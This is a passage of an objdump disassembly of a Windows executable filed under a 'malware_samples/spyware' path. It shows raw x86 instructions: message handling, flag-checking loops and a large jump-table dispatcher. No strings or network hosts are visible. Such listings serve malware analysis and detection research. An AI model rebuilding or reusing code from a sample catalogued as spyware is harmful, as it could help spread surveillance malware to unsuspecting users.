
malware_samples/spyware/a2f9f5a099a6b1c2ba6789effefa150aec52c5587e85df9a6963fd03b55d4d57.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 a2 42 00    	mov    0x42a268,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 84 82 40 00    	call   *0x408284
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 74 a2 42 00    	mov    0x42a274,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 88 82 40 00    	call   *0x408288
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 94 81 40 00    	call   *0x408194
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 60 80 40 00    	mov    0x408060,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 5c 80 40 00    	call   *0x40805c
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 c4 81 40 00    	call   *0x4081c4
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 58 80 40 00    	call   *0x408058
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 4c 80 40 00    	call   *0x40804c
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 68 80 40 00    	mov    0x408068,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 92 42 00       	push   $0x429260
  401155:	57                   	push   %edi
  401156:	ff 15 9c 81 40 00    	call   *0x40819c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 98 81 40 00    	call   *0x408198
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 a8 a2 42 00       	mov    0x42a2a8,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 ac a2 42 00    	cmp    0x42a2ac,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 ac a2 42 00    	cmp    0x42a2ac,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d a8 a2 42 00    	mov    0x42a2a8,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 ac a2 42 00    	cmp    0x42a2ac,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 ac a2 42 00    	cmp    0x42a2ac,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 a8 a2 42 00       	mov    0x42a2a8,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 ac a2 42 00    	cmp    %esi,0x42a2ac
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 ac a2 42 00    	cmp    0x42a2ac,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 74 a2 42 00       	mov    0x42a274,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d ac a2 42 00    	mov    0x42a2ac,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 a8 a2 42 00    	mov    0x42a2a8,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 b0 42 00       	mov    $0x42b000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 16 51 00 00       	call   0x40649c
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d b0 a2 42 00    	mov    0x42a2b0,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c 92 42 00    	add    %eax,0x42924c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 92 42 00    	push   0x429234
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c 92 42 00    	push   0x42924c
  4013e4:	ff 15 fc 80 40 00    	call   *0x4080fc
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 80 82 40 00    	call   *0x408280
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 74 a2 42 00    	mov    0x42a274,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 f8 ad 40 00       	push   $0x40adf8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 73 41 00 00       	call   0x4055a4
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 68 a2 42 00       	mov    0x42a268,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 b0 42 00       	mov    $0x42b000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 54 ce 40 00    	mov    %ecx,0x40ce54
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 38 17 00 00    	ja     0x402bc2
  40148a:	ff 24 8d d4 2b 40 00 	jmp    *0x402bd4(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 0c 41 00 00       	call   0x4055a4
  401498:	e9 f8 0e 00 00       	jmp    0x402395
  40149d:	ff 05 2c 92 42 00    	incl   0x42922c
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 e9 0e 00 00    	je     0x402395
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 48 82 40 00    	call   *0x408248
  4014b3:	e9 dd 0e 00 00       	jmp    0x402395
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 02 17 00 00       	jmp    0x402bcd
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 d2 40 00 00       	call   0x4055a4
  4014d2:	e9 eb 16 00 00       	jmp    0x402bc2
  4014d7:	53                   	push   %ebx
  4014d8:	e8 3f 18 00 00       	call   0x402d1c
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 88 80 40 00    	call   *0x408088
  4014f0:	e9 cd 16 00 00       	jmp    0x402bc2
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 4c 82 40 00    	call   *0x40824c
  4014fe:	e9 bf 16 00 00       	jmp    0x402bc2
  401503:	c1 e0 02             	shl    $0x2,%eax
  401506:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401509:	75 26                	jne    0x401531
  40150b:	8b 88 00 a3 42 00    	mov    0x42a300(%eax),%ecx
  401511:	6a 01                	push   $0x1
  401513:	89 88 40 a3 42 00    	mov    %ecx,0x42a340(%eax)
  401519:	e8 fe 17 00 00       	call   0x402d1c
  40151e:	59                   	pop    %ecx
  40151f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401522:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401525:	89 04 8d 00 a3 42 00 	mov    %eax,0x42a300(,%ecx,4)
  40152c:	e9 91 16 00 00       	jmp    0x402bc2
  401531:	8b 88 40 a3 42 00    	mov    0x42a340(%eax),%ecx
  401537:	89 88 00 a3 42 00    	mov    %ecx,0x42a300(%eax)
  40153d:	e9 80 16 00 00       	jmp    0x402bc2
  401542:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401545:	8d 34 85 00 a3 42 00 	lea    0x42a300(,%eax,4),%esi
  40154c:	33 c0                	xor    %eax,%eax
  40154e:	8b 0e                	mov    (%esi),%ecx
  401550:	3b cb                	cmp    %ebx,%ecx
  401552:	0f 94 c0             	sete   %al
  401555:	23 4d dc             	and    -0x24(%ebp),%ecx
  401558:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  40155c:	89 0e                	mov    %ecx,(%esi)
  40155e:	e9 6a 16 00 00       	jmp    0x402bcd
  401563:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401566:	ff 34 85 00 a3 42 00 	push   0x42a300(,%eax,4)
  40156d:	57                   	push   %edi
  40156e:	e9 95 15 00 00       	jmp    0x402b08
  401573:	8b 0d 30 92 42 00    	mov    0x429230,%ecx
  401579:	8b 35 50 82 40 00    	mov    0x408250,%esi
  40157f:	3b cb                	cmp    %ebx,%ecx
  401581:	74 09                	je     0x40158c
  401583:	ff 75 d4             	push   -0x2c(%ebp)
  401586:	51                   	push   %ecx
  401587:	ff d6                	call   *%esi
  401589:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40158c:	8b 0d 44 92 42 00    	mov    0x429244,%ecx
  401592:	3b cb                	cmp    %ebx,%ecx
  401594:	0f 84 28 16 00 00    	je     0x402bc2
  40159a:	50                   	push   %eax
  40159b:	51                   	push   %ecx
  40159c:	ff d6                	call   *%esi
  40159e:	e9 1f 16 00 00       	jmp    0x402bc2
  4015a3:	6a f0                	push   $0xfffffff0
  4015a5:	e8 94 17 00 00       	call   0x402d3e
  4015aa:	ff 75 d4             	push   -0x2c(%ebp)
  4015ad:	50                   	push   %eax
  4015ae:	ff 15 00 81 40 00    	call   *0x408100
  4015b4:	85 c0                	test   %eax,%eax
  4015b6:	0f 85 06 16 00 00    	jne    0x402bc2
  4015bc:	e9 64 13 00 00       	jmp    0x402925
  4015c1:	6a f0                	push   $0xfffffff0
  4015c3:	e8 76 17 00 00       	call   0x402d3e
  4015c8:	50                   	push   %eax
  4015c9:	89 45 08             	mov    %eax,0x8(%ebp)
  4015cc:	e8 eb 48 00 00       	call   0x405ebc
  4015d1:	8b f0                	mov    %eax,%esi
  4015d3:	3b f3                	cmp    %ebx,%esi
  4015d5:	74 5a                	je     0x401631
  4015d7:	6a 5c                	push   $0x5c
  4015d9:	56                   	push   %esi
  4015da:	e8 5f 48 00 00       	call   0x405e3e
  4015df:	8b f0                	mov    %eax,%esi
  4015e1:	66 8b 3e             	mov    (%esi),%di
  4015e4:	66 89 1e             	mov    %bx,(%esi)
  4015e7:	66 3b fb             	cmp    %bx,%di
  4015ea:	75 18                	jne    0x401604
  4015ec:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4015ef:	74 13                	je     0x401604
  4015f1:	e8 17 45 00 00       	call   0x405b0d
  4015f6:	85 c0                	test   %eax,%eax
  4015f8:	74 0a                	je     0x401604
  4015fa:	ff 75 08             	push   0x8(%ebp)
  4015fd:	e8 71 44 00 00       	call   0x405a73
  401602:	eb 08                	jmp    0x40160c
  401604:	ff 75 08             	push   0x8(%ebp)
  401607:	e8 e4 44 00 00       	call   0x405af0
  40160c:	3b c3                	cmp    %ebx,%eax
  40160e:	74 17                	je     0x401627
  401610:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401615:	75 0d                	jne    0x401624
  401617:	ff 75 08             	push   0x8(%ebp)
  40161a:	ff 15 04 81 40 00    	call   *0x408104
  401620:	a8 10                	test   $0x10,%al
  401622:	75 03                	jne    0x401627
  401624:	ff 45 fc             	incl   -0x4(%ebp)
  401627:	66 89 3e             	mov    %di,(%esi)
  40162a:	46                   	inc    %esi
  40162b:	46                   	inc    %esi
  40162c:	66 3b fb             	cmp    %bx,%di
  40162f:	75 a6                	jne    0x4015d7
  401631:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401634:	74 2d                	je     0x401663
  401636:	6a e6                	push   $0xffffffe6
  401638:	e8 e6 fd ff ff       	call   0x401423
  40163d:	ff 75 08             	push   0x8(%ebp)
  401640:	68 00 60 43 00       	push   $0x436000
  401645:	e8 f2 4e 00 00       	call   0x40653c
  40164a:	ff 75 08             	push   0x8(%ebp)
  40164d:	ff 15 08 81 40 00    	call   *0x408108
  401653:	85 c0                	test   %eax,%eax
  401655:	0f 85 67 15 00 00    	jne    0x402bc2
  40165b:	ff 45 fc             	incl   -0x4(%ebp)
  40165e:	e9 5f 15 00 00       	jmp    0x402bc2
  401663:	6a f5                	push   $0xfffffff5
  401665:	e9 7f 0c 00 00       	jmp    0x4022e9
  40166a:	53                   	push   %ebx
  40166b:	e8 ce 16 00 00       	call   0x402d3e
  401670:	50                   	push   %eax
  401671:	e8 24 52 00 00       	call   0x40689a
  401676:	e9 ad 06 00 00       	jmp    0x401d28
  40167b:	6a d0                	push   $0xffffffd0
  40167d:	e8 bc 16 00 00       	call   0x402d3e
  401682:	6a df                	push   $0xffffffdf
  401684:	8b f0                	mov    %eax,%esi
  401686:	e8 b3 16 00 00       	call   0x402d3e
  40168b:	6a 13                	push   $0x13
  40168d:	8b f8                	mov    %eax,%edi
  40168f:	e8 aa 16 00 00       	call   0x402d3e
  401694:	57                   	push   %edi
  401695:	56                   	push   %esi
  401696:	ff 15 0c 81 40 00    	call   *0x40810c
  40169c:	85 c0                	test   %eax,%eax
  40169e:	74 07                	je     0x4016a7
  4016a0:	6a e3                	push   $0xffffffe3
  4016a2:	e9 42 0c 00 00       	jmp    0x4022e9
  4016a7:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016aa:	0f 84 75 12 00 00    	je     0x402925
  4016b0:	56                   	push   %esi
  4016b1:	e8 e4 51 00 00       	call   0x40689a
  4016b6:	85 c0                	test   %eax,%eax
  4016b8:	0f 84 67 12 00 00    	je     0x402925
  4016be:	57                   	push   %edi
  4016bf:	56                   	push   %esi
  4016c0:	e8 3d 4c 00 00       	call   0x406302
  4016c5:	6a e4                	push   $0xffffffe4
  4016c7:	e9 1d 0c 00 00       	jmp    0x4022e9
  4016cc:	53                   	push   %ebx
  4016cd:	e8 6c 16 00 00       	call   0x402d3e
  4016d2:	8b 7d f4             	mov    -0xc(%ebp),%edi
